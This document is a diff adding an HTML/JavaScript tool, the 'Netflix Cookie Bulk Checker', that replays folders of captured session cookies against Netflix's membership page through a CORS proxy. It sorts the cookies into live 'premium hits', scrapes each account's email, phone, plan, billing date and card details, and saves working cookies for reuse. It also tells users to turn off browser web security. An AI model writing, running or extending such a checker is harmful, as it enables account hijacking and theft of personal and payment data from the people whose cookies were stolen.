@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>NETFLIX COOKIE CHECKER - UGLY VERSION</title>
+    <!-- beginner style: ugly fonts, bright colors, no rounded corners, old-school -->
+    <style>
+        body {
+            background: #FFEE99;
+            color: #000000;
+            font-family: 'Comic Sans MS', 'Times New Roman', 'Courier New', monospace;
+            margin: 20px;
+        }
+        h1 {
+            background: #FF0000;
+            color: #FFFF00;
+            font-size: 28px;
+            padding: 8px;
+            border: 3px solid black;
+            text-align: center;
+        }
+        .container {
+            border: 4px solid #000000;
+            background: #FFFFFF;
+            padding: 10px;
+        }
+        .warning-banner {
+            background: #FFCCCC;
+            border: 2px solid red;
+            padding: 8px;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .controls {
+            background: #DDDDDD;
+            padding: 10px;
+            border: 2px solid gray;
+            margin-bottom: 15px;
+        }
+        .control-group {
+            margin-bottom: 12px;
+        }
+        label {
+            font-weight: bold;
+            display: inline-block;
+            width: 140px;
+        }
+        input, button, select {
+            background: #FFFFFF;
+            border: 2px inset #888888;
+            padding: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        button {
+            background: #CCCCCC;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:active {
+            border: 2px outset #888888;
+        }
+        .stat-grid {
+            background: #EEEEAA;
+            border: 1px solid black;
+            padding: 8px;
+            margin: 10px 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .stat-card {
+            background: #FFFFCC;
+            border: 1px solid #000;
+            padding: 6px 12px;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .progress-area {
+            margin: 12px 0;
+        }
+        .progress-bar-bg {
+            background: #AAAAAA;
+            border: 1px solid black;
+            height: 20px;
+        }
+        .progress-fill {
+            background: #00AA00;
+            width: 0%;
+            height: 100%;
+        }
+        .logs-panel {
+            background: #000000;
+            color: #00FF00;
+            font-family: 'Courier New', monospace;
+            border: 3px solid lime;
+            height: 220px;
+            overflow-y: scroll;
+            padding: 6px;
+            margin: 12px 0;
+        }
+        .log-entry {
+            border-bottom: 1px dotted #33FF33;
+            padding: 3px 0;
+            white-space: pre-wrap;
+        }
+        .log-hit {
+            color: #FFFF00;
+            font-weight: bold;
+        }
+        .log-bad {
+            color: #FF6666;
+        }
+        table {
+            background: #FFFFFF;
+            border: 3px solid black;
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th {
+            background: #CCCCCC;
+            border: 1px solid black;
+            padding: 5px;
+        }
+        td {
+            border: 1px solid black;
+            padding: 4px;
+            vertical-align: top;
+        }
+        .hit-actions button {
+            background: #AAAAFF;
+            padding: 2px 8px;
+        }
+        .footer-note {
+            background: #DDDDDD;
+            border: 1px solid gray;
+            margin-top: 15px;
+            padding: 8px;
+            font-size: 12px;
+        }
+        a {
+            color: #0000EE;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>NETFLIX COOKIE BULK CHECKER (BEGINNER EDITION)</h1>
+
+    <div class="warning-banner">
+        [WARN] CORS & SECURITY NOTICE: Modern browsers block custom Cookie headers. To use this tool, launch Chrome with --disable-web-security --user-data-dir=C:/temp OR use Firefox with CORS disabled. You MUST enable the CORS proxy: <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">click here</a> then press "Request temporary access".
+    </div>
+
+    <div class="controls">
+        <div class="control-group">
+            <label>COOKIES FOLDER:</label>
+            <input type="file" id="folderInput" webkitdirectory directory multiple>
+        </div>
+        <div class="control-group">
+            <label>THREADS (1-20):</label>
+            <input type="number" id="threadsInput" value="5" min="1" max="20" style="width:70px">
+        </div>
+        <div class="control-group">
+            <label>CORS PROXY URL:</label>
+            <input type="text" id="proxyUrl" value="https://cors-anywhere.herokuapp.com/" style="width:280px">
+        </div>
+        <div class="control-group">
+            <button id="startBtn">START CHECKING</button>
+            <button id="stopBtn">STOP</button>
+        </div>
+    </div>
+
+    <div class="stat-grid">
+        <div class="stat-card"><div class="stat-value" id="statTotal">0</div><div>Total Cookies</div></div>
+        <div class="stat-card"><div class="stat-value" id="statChecked">0</div><div>Checked</div></div>
+        <div class="stat-card"><div class="stat-value" id="statHits">0</div><div>Premium Hits</div></div>
+        <div class="stat-card"><div class="stat-value" id="statBad">0</div><div>Bad/Invalid</div></div>
+        <div class="stat-card"><div class="stat-value" id="statErrors">0</div><div>Errors</div></div>
+        <div class="stat-card"><div class="stat-value" id="statCpm">0</div><div>CPM</div></div>
+    </div>
+
+    <div class="progress-area">
+        <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+
+    <div class="logs-panel" id="logPanel">
+        <div class="log-entry">[INFO] Ready. Select cookie folder (Netscape format) and start.</div>
+    </div>
+
+    <h3>PREMIUM ACCOUNTS FOUND (click save to download .txt cookie)</h3>
+    <div style="overflow-x:auto;">
+        <table id="hitsTable">
+            <thead>
+                <tr><th>#</th><th>Email / Name</th><th>Plan</th><th>Country</th><th>Next billing</th><th>Cookie (trunc)</th><th>Action</th></tr>
+            </thead>
+            <tbody id="hitsTbody"></tbody>
+        </table>
+    </div>
+
+    <div class="footer-note">
+        [NOTE] Hits are stored in memory. Click "Save cookie" to download a .txt file containing the raw cookie line.<br>
+        * Netflix membership validation requires CURRENT_MEMBER status from /account/membership.
+    </div>
+</div>
+
+<script>
+    // ---------- DOM elements ----------
+    const folderInput = document.getElementById('folderInput');
+    const threadsInput = document.getElementById('threadsInput');
+    const proxyUrlInput = document.getElementById('proxyUrl');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const statTotalEl = document.getElementById('statTotal');
+    const statCheckedEl = document.getElementById('statChecked');
+    const statHitsEl = document.getElementById('statHits');
+    const statBadEl = document.getElementById('statBad');
+    const statErrorsEl = document.getElementById('statErrors');
+    const statCpmEl = document.getElementById('statCpm');
+    const progressFill = document.getElementById('progressFill');
+    const logPanel = document.getElementById('logPanel');
+    const hitsTbody = document.getElementById('hitsTbody');
+
+    // ---------- state ----------
+    let active = false;
+    let stopRequested = false;
+    let currentFiles = [];
+    let stats = {
+        total: 0,
+        checked: 0,
+        hits: 0,
+        bad: 0,
+        errors: 0,
+        startTime: 0
+    };
+    let premiumAccounts = [];
+
+    // helper: add log (no emojis)
+    function addLog(msg, isHit = false, isBad = false) {
+        const logDiv = document.createElement('div');
+        logDiv.className = 'log-entry';
+        if (isHit) logDiv.classList.add('log-hit');
+        if (isBad) logDiv.classList.add('log-bad');
+        logDiv.textContent = msg;
+        logPanel.appendChild(logDiv);
+        logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        if (logPanel.children.length > 500) logPanel.removeChild(logPanel.children[0]);
+    }
+
+    function updateStatsUI() {
+        statTotalEl.innerText = stats.total;
+        statCheckedEl.innerText = stats.checked;
+        statHitsEl.innerText = stats.hits;
+        statBadEl.innerText = stats.bad;
+        statErrorsEl.innerText = stats.errors;
+        const elapsed = (Date.now() - stats.startTime) / 1000;
+        let cpm = 0;
+        if (elapsed > 0 && stats.checked > 0) cpm = Math.floor((stats.checked / elapsed) * 60);
+        statCpmEl.innerText = cpm;
+        const percent = stats.total === 0 ? 0 : (stats.checked / stats.total) * 100;
+        progressFill.style.width = percent + '%';
+    }
+
+    function renderHitsTable() {
+        hitsTbody.innerHTML = '';
+        premiumAccounts.forEach((acc, idx) => {
+            const row = hitsTbody.insertRow();
+            row.insertCell(0).innerText = idx+1;
+            row.insertCell(1).innerText = (acc.email || acc.name || 'unknown').substring(0, 35);
+            row.insertCell(2).innerText = acc.plan || '?';
+            row.insertCell(3).innerText = `${acc.country_code || ''} ${acc.country || ''}`;
+            row.insertCell(4).innerText = acc.next_billing || 'N/A';
+            const cookieShort = (acc.cookie || '').substring(0, 28) + (acc.cookie?.length > 28 ? '...' : '');
+            row.insertCell(5).innerText = cookieShort;
+            const btnCell = row.insertCell(6);
+            btnCell.className = 'hit-actions';
+            const saveBtn = document.createElement('button');
+            saveBtn.innerText = 'Save cookie';
+            saveBtn.onclick = (e) => {
+                e.stopPropagation();
+                downloadCookieFile(acc, idx);
+            };
+            btnCell.appendChild(saveBtn);
+        });
+    }
+
+    function downloadCookieFile(account, idx) {
+        const safeEmail = (account.email || `account_${idx+1}`).replace(/[^a-z0-9]/gi, '_');
+        const planSlug = (account.plan || 'unknown').replace(/\s+/g, '_');
+        const filename = `[${account.country_code || 'XX'}]_${safeEmail}_${planSlug}.txt`;
+        const cookieData = account.cookie || '';
+        const blob = new Blob([cookieData], {type: 'text/plain'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        addLog(`Saved cookie: ${filename}`, false);
+    }
+
+    // cookie cleaning (netscape lines only)
+    function cleanCookieContent(rawText) {
+        const lines = rawText.split(/\r?\n/);
+        const cleaned = [];
+        const cookiePattern = /^([^\t]+)\t([^\t]+)\t([^\t]+)\t([^\t]+)\t(\d+)\t([^\t]+)\t(.+)$/;
+        for (let line of lines) {
+            line = line.trim();
+            if (!line || line.startsWith('#')) continue;
+            if (cookiePattern.test(line)) {
+                cleaned.push(line);
+            }
+        }
+        return cleaned.join('\n');
+    }
+
+    function parseNetscapeCookie(cookieText) {
+        const cookies = {};
+        const lines = cookieText.split(/\r?\n/);
+        for (let line of lines) {
+            line = line.trim();
+            if (!line || line.startsWith('#')) continue;
+            const parts = line.split('\t');
+            if (parts.length >= 7) {
+                const name = parts[5];
+                const value = parts[6];
+                if (name && value) cookies[name] = value;
+            }
+        }
+        return cookies;
+    }
+
+    function decodeUnicode(str) {
+        if (!str) return str;
+        try {
+            if (str.includes('\\u')) str = JSON.parse(`"${str.replace(/"/g, '\\"')}"`);
+        } catch(e) {}
+        try {
+            if (str.includes('\\x')) str = str.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex,16)));
+        } catch(e) {}
+        return str;
+    }
+
+    function parseNetflixHtml(html, cookieLine) {
+        if (!html.includes('"membershipStatus":"CURRENT_MEMBER"')) return null;
+        const result = {};
+        const countryMatch = html.match(/"countryOfSignup":"([^"]+)"/);
+        if (countryMatch) result.country_code = countryMatch[1];
+        const emailMatch = html.match(/"emailAddress":"([^"]+)"/);
+        if (emailMatch) result.email = decodeUnicode(emailMatch[1]);
+        const planMatch = html.match(/"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (planMatch) result.plan = decodeUnicode(planMatch[1]);
+        const priceMatch = html.match(/"currentMemberPlanPriceAmount":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (priceMatch) result.price = priceMatch[1];
+        const memberMatch = html.match(/"memberSinceDate":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (memberMatch) result.member_since = memberMatch[1];
+        const billingMatch = html.match(/"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (billingMatch) result.next_billing = billingMatch[1];
+        const paymentMatch = html.match(/"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (paymentMatch) result.payment_method = paymentMatch[1];
+        const brandMatch = html.match(/"ccPaymentMethodBrandName":"([^"]+)"/);
+        if (brandMatch) result.card_brand = brandMatch[1];
+        const last4Match = html.match(/"lastFourDigits":"([^"]+)"/);
+        if (last4Match) result.card_last4 = last4Match[1];
+        const phoneMatch = html.match(/"phoneNumber":"([^"]+)"/);
+        if (phoneMatch) result.phone = decodeUnicode(phoneMatch[1]);
+        const phoneVerified = html.match(/"isPhoneVerified":(true|false)/);
+        if (phoneVerified) result.phone_verified = phoneVerified[1] === 'true';
+        const streamsMatch = html.match(/"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}/);
+        if (streamsMatch) result.max_streams = parseInt(streamsMatch[1]);
+        const qualityMatch = html.match(/"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}/);
+        if (qualityMatch) {
+            let q = qualityMatch[1];
+            if (q === 'hd') result.video_quality = 'HD720p';
+            else if (q === 'uhd') result.video_quality = 'UHD 4K';
+            else result.video_quality = q.toUpperCase();
+        }
+        const extraMatch = html.match(/"extraMemberSlots":(\d+)/);
+        if (extraMatch) result.extra_member = parseInt(extraMatch[1]) > 0 ? 'Yes' : 'No';
+        const profileNames = [...html.matchAll(/"profileName":\{"fieldType":"String","value":"([^"]+)"\}/g)];
+        if (profileNames.length) {
+            result.profiles = profileNames.map(m => decodeUnicode(m[1]));
+            result.profile_count = result.profiles.length;
+            result.name = result.profiles[0];
+        } else {
+            result.profile_count = 0;
+            result.name = result.email?.split('@')[0] || 'User';
+        }
+        result.cookie = cookieLine;
+        result.source = 'web_upload';
+        result.login_url = '# (use cookie)';
+        return result;
+    }
+
+    async function checkSingleCookie(cleanedCookieText, fileName) {
+        if (!cleanedCookieText) return null;
+        const cookiesDict = parseNetscapeCookie(cleanedCookieText);
+        if (Object.keys(cookiesDict).length === 0) return null;
+        const cookieHeader = Object.entries(cookiesDict).map(([k,v]) => `${k}=${v}`).join('; ');
+        const proxyBase = proxyUrlInput.value.trim().replace(/\/$/, '');
+        const targetUrl = 'https://www.netflix.com/account/membership';
+        const proxiedUrl = `${proxyBase}/${targetUrl}`;
+        
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 20000);
+            const response = await fetch(proxiedUrl, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Cookie': cookieHeader,
+                    'Accept': 'text/html,application/xhtml+xml',
+                    'Pragma': 'no-cache'
+                },
+                signal: controller.signal,
+                credentials: 'omit'
+            });
+            clearTimeout(timeoutId);
+            if (!response.ok) return null;
+            const html = await response.text();
+            if (html.includes('login') && !html.includes('CURRENT_MEMBER')) return null;
+            const accountData = parseNetflixHtml(html, cookieHeader);
+            if (accountData) {
+                accountData.source_file = fileName;
+                return accountData;
+            }
+            return null;
+        } catch (err) {
+            console.warn(err);
+            return null;
+        }
+    }
+
+    async function processCookieFile(fileObj, filePath, index) {
+        if (stopRequested) return;
+        let rawText = '';
+        try {
+            rawText = await fileObj.text();
+        } catch(e) {
+            addLog(`ERROR reading ${filePath}`, false, true);
+            stats.errors++;
+            updateStatsUI();
+            return;
+        }
+        const cleaned = cleanCookieContent(rawText);
+        if (!cleaned) {
+            stats.bad++;
+            stats.checked++;
+            updateStatsUI();
+            addLog(`BAD / no valid cookie lines: ${filePath}`, false, true);
+            return;
+        }
+        try {
+            const result = await checkSingleCookie(cleaned, filePath);
+            if (result) {
+                stats.hits++;
+                premiumAccounts.push(result);
+                renderHitsTable();
+                addLog(`[HIT #${stats.hits}] ${result.email || result.name} | ${result.plan} | ${result.country_code || '??'}`, true);
+            } else {
+                stats.bad++;
+                addLog(`FAILED / invalid: ${filePath}`, false, true);
+            }
+        } catch (e) {
+            stats.errors++;
+            addLog(`ERROR ${filePath}: ${e.message}`, false, true);
+        } finally {
+            stats.checked++;
+            updateStatsUI();
+        }
+    }
+
+    async function runBulkChecker(filesArray, concurrency) {
+        const queue = [...filesArray];
+        let activeWorkers = 0;
+        let resolveFinal;
+        const finalPromise = new Promise((resolve) => { resolveFinal = resolve; });
+        
+        const worker = async () => {
+            while (queue.length > 0 && !stopRequested) {
+                const item = queue.shift();
+                if (!item) break;
+                activeWorkers++;
+                await processCookieFile(item.fileObj, item.name, item.idx);
+                activeWorkers--;
+            }
+            if (activeWorkers === 0 && queue.length === 0) resolveFinal();
+        };
+        
+        const workers = [];
+        for (let i = 0; i < concurrency; i++) {
+            workers.push(worker());
+        }
+        await finalPromise;
+    }
+
+    async function readAllCookieFiles(filesList) {
+        const cookieFiles = [];
+        for (let i = 0; i < filesList.length; i++) {
+            const file = filesList[i];
+            if (file.webkitRelativePath || file.name) {
+                const path = file.webkitRelativePath || file.name;
+                if (file.name.endsWith('.txt') || file.type === 'text/plain' || !file.name.includes('.')) {
+                    cookieFiles.push({ fileObj: file, name: path, idx: i });
+                }
+            }
+        }
+        return cookieFiles;
+    }
+
+    async function startChecking() {
+        if (active) {
+            addLog('Already running, press STOP first.', false);
+            return;
+        }
+        if (!folderInput.files || folderInput.files.length === 0) {
+            addLog('ERROR: Select a cookie folder (use directory picker)', false, true);
+            return;
+        }
+        stopRequested = false;
+        active = true;
+        stats = {
+            total: 0,
+            checked: 0,
+            hits: 0,
+            bad: 0,
+            errors: 0,
+            startTime: Date.now()
+        };
+        premiumAccounts = [];
+        renderHitsTable();
+        updateStatsUI();
+        addLog('Loading cookies from folder ...');
+        
+        const allFiles = await readAllCookieFiles([...folderInput.files]);
+        if (allFiles.length === 0) {
+            addLog('ERROR: No cookie files (.txt / netscape) found in selected directory.', false, true);
+            active = false;
+            return;
+        }
+        stats.total = allFiles.length;
+        updateStatsUI();
+        currentFiles = allFiles;
+        const concurrency = parseInt(threadsInput.value) || 5;
+        addLog(`Loaded ${stats.total} cookie files. Starting with ${concurrency} threads.`);
+        
+        try {
+            await runBulkChecker(currentFiles, concurrency);
+        } catch (err) {
+            addLog(`Bulk error: ${err.message}`, false, true);
+        }
+        const elapsedSec = ((Date.now() - stats.startTime)/1000).toFixed(1);
+        addLog(`FINISHED. Checked ${stats.checked} files. Hits: ${stats.hits} | Bad: ${stats.bad} | Errors: ${stats.errors} in ${elapsedSec}s`);
+        if (stats.hits > 0) addLog(`Premium accounts saved in table -> click "Save cookie" button.`);
+        active = false;
+        stopRequested = false;
+    }
+    
+    function stopChecking() {
+        if (!active) {
+            addLog(`Not running.`, false);
+            return;
+        }
+        stopRequested = true;
+        addLog(`Stopping after current batch...`, false);
+        active = false;
+    }
+    
+    startBtn.addEventListener('click', () => {
+        if (active) { addLog('Already checking, press STOP first.', false); return; }
+        startChecking().catch(e => addLog(`Start error: ${e.message}`, false, true));
+    });
+    stopBtn.addEventListener('click', stopChecking);
+    
+    setInterval(() => {
+        if (stats.startTime && stats.checked > 0 && active) updateStatsUI();
+        else if (!active && stats.startTime) updateStatsUI();
+    }, 800);
+    
+    addLog('Ready. 1) Enable CORS proxy via link above. 2) Choose folder with netscape cookies (.txt). 3) Start scanning.');
+</script>
+</body>
+</html>
